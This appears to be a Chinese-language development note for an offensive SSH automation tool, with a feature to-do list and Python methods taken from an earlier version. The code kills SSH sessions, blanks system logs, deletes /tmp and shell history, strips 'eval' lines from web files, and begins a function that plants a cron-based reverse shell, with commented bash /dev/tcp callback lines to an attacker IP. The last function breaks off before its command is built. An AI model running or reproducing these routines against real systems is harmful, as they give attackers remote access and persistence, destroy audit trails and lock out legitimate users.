## sshcli

- ~~添加一个hosts对应username password的功能，可以不使用统一账号密码~~
  - ~~上述dict，可以存成文件，导入导出~~
- ~~添加config文件，设置代理，默认default值等~~ 
  - ~~代理目前的解决办法是：通过proxychains4配置代理使用~~
  - ~~代理可以使用 `--proxy`开启内部代理，配置代理文件或设置代理环境变量即可~~

- ~~传ip段和端口，划分hosts~~
- ~~添加通过密钥登录功能~~
- 写定时任务
- 反弹shell，指定端口范围类似 ：[1337, 4444, 10001-20000, 20001-30000]
  - 若能指定ip列表，和对应的端口列表最好，类似：{ip1:  [......], ip2: [......]}
  - 执行后，将对应的host和接收的ip端口也一一对应，类似：{host1: "ip1:port1", host2: "ip2:port2"}
  - 上述两个dict，可以存成文件，导入导出
- 清理日志，历史记录等
- 断掉其他人连接的ssh，因为改密码后不会断ssh，所以可以断掉进程
- 具体功能，参考我golang写的shell server里的功能，一并移植
- 可以在**权限维持**，**隐藏操作、日志等**方面更多的提升自动化性和多样性



## listencli

- 配合sshcli使用。
- 用于批量指定端口范围，监听并管理反弹shell。
  - 具体问题是：如何像ssh一样建立一个持久化的conn，可以管理反弹shell。



## 参考

参考之前我写的工具功能

问：为什么之前写过而现在要重写？

答：

- 之前写的早了，很多东西不太熟练，代码风格不好，而且不易扩展。
- 之前是基于paramiko这个库写的，而且是独立连接攻击每个host，很慢不稳定。
- 而现在是基于asyncssh的异步连接，而且在程序运行时，会统一连接完成之后，再进行后续操作。
- 之前没有扩展成命令行，只能通过修改脚本来实现攻击，而现在是命令行交互。



```python
    def pkill_ssh(self, *, ssh, command: str = None, username) -> tuple[bytes, bytes]:

        if ssh is None:
            return b"", b"Exception: ssh is None."

        if username == "root":
            command = "pkill ssh -9" if command is None else command
            stdin, stdout, stderr = ssh.exec_command(command)
        else:
            command = "sudo pkill ssh -9" if command is None else command
            stdin, stdout, stderr = ssh.exec_command(command)
            stdin.write(self.new_passwd + '\n')

            out, err = stdout.read(), stderr.read()
            print(f"stdout: {out}")
            print(f"stderr: {err}")

            failed_string = b"sudo: no tty present and no askpass program specified\n"
            if failed_string in err:
                print(f"{failed_string.decode()}")
                command = "pkill ssh -9"
                stdin, stdout, stderr = ssh.exec_command(command)
                stdin.write(self.new_passwd + '\n')

        out, err = stdout.read(), stderr.read()

        # print(f"stdout: {out}")
        # print(f"stderr: {err}")

        return out, err
```



```python
    def clear_the_mark(self, *, ssh, command: str = None, username: str = None) -> tuple[bytes, bytes]:
        if ssh is None:
            return b"", b"Exception: ssh is None."

        if username is None and self.username is not None:
            username = self.username
        elif username is None and self.username is None:
            return b"", b"Exception: username and self.username is None."

        if command is None:
            if username == "root":
                command = """find /var/log -type f -print0 | xargs -0 -I {} sh -c 'echo " " > "{}"';"""
                command += "rm -rf /tmp/{*,.*};"
                command += "find /var/www/html -type f -print0 | xargs -0 sed -i '/eval/d';"
                command += "rm ~/.*history;"
                command += "history -c;"
                command += "history -w;"
                command += "history -c;"
                # command += "pkill ssh -9;"
            else:
                stdin, stdout, stderr = ssh.exec_command("sudo whoami")
                stdin.write(self.new_passwd + '\n')

                out, err = stdout.read(), stderr.read()
                if "root" in out or "root" in err:
                    command = """sudo find /var/log -type f -print0 | xargs -0 -I {} sh -c 'echo " " > "{}"';"""
                    command += "sudo rm -rf /tmp/{*,.*};"
                    command += "sudo find /var/www/html -type f -print0 | xargs -0 sed -i '/eval/d';"
                    command += "sudo rm ~/.*history;"
                    command += "sudo rm /root/.*history;"
                    command += "sudo history -c;"
                    command += "sudo history -w;"
                    command += "sudo history -c;"
                    # command += "sudo pkill ssh -9;"
                else:
                    command = """find /var/log -type f -print0 | xargs -0 -I {} sh -c 'echo " " > "{}"';"""
                    command += "rm -rf /tmp/{*,.*};"
                    command += "find /var/www/html -type f -print0 | xargs -0 sed -i '/eval/d';"
                    command += "rm ~/.*history;"
                    command += "history -c;"
                    command += "history -w;"
                    command += "history -c;"
                    # command += "pkill ssh -9;"

        # print(f"{command = }")
        stdin, stdout, stderr = ssh.exec_command(command)
        out, err = stdout.read(), stderr.read()

        # print(f"stdout: {out}")
        # print(f"stderr: {err}")

        return out, err

    def rebound_shell_to_crontab(self, *, ssh, command: str = None, username: str = None,
                                 is_ubuntu: bool = True, is_system_level: bool = True,
                                 attacker_ip: str, attacker_port: int, is_tcp: bool = True,
                                 planned_time: int = 1) -> tuple[bytes, bytes]:
        if ssh is None:
            return b"", b"Exception: ssh is None."

        if username is None and self.username is not None:
            username = self.username
        elif username is None and self.username is None:
            return b"", b"Exception: username and self.username is None."

        if attacker_ip is None or attacker_port is None:
            return b"", b"Exception: The ip and port of the attack aircraft are missing."

        method = "tcp" if is_tcp else "udp"

        ubuntu_crontab = "crontabs/" if is_ubuntu else ""
        crontab_path = "/etc/crontab" if is_system_level else f"/var/spool/cron/{ubuntu_crontab}{username}"
        need_user_string = f"{username} " if is_system_level else ""

        # f"""echo '*/{planned_time} * * * * root bash -c "bash -i >& /dev/{method}/{attacker_ip}/{attacker_port} 0>&1"' >> /etc/crontab"""
        # 分、时、日、月、周

        # 'echo \'*/1 * * * * root bash -c "bash -i >& /dev/tcp/192.168.75.136/4444 0>&1"\' >> /etc/crontab;'
        # */1 * * * * root echo test > /root/tmp/1.txt
```

